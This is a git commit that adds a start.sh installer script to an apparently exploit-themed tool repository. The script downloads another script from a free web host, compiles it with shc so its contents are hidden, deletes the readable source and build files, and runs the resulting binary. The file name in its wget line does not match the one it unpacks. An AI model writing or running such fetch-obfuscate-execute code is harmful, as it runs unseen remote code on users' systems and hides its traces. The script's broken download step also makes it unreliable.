cd3b0269d6320d5acbecd17d6935e50fe9426ea2
yamanefkar <38867900+yamanefkar@users.noreply.github.com>
2019-08-07 09:53:52 +0300

    Add files via upload

---
+++ start.sh
@@ -0,0 +1,14 @@
+#!/bin/bash
+apt install shc -y
+cd $HOME
+wget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9.tg
+tar -xvf shc-3.8.9.tgz
+cd shc-3.8.9/
+make
+curl -O https://turksibertimi-forum.000webhostapp.com/start.sh
+shc -f start.sh
+rm -rf $HOME/Turk-Sploit-Pluas/start.sh
+cd $HOME/shc-3.8.9/ && cp start.sh.x  $HOME/Turk-Sploit-Pluas/
+rm -rf $HOME/shc-3.8.9.tgz
+rm -rf $HOME/shc-3.8.9/
+cd $HOME/Turk-Sploit-Pluas/ && ls && ./start.sh.x
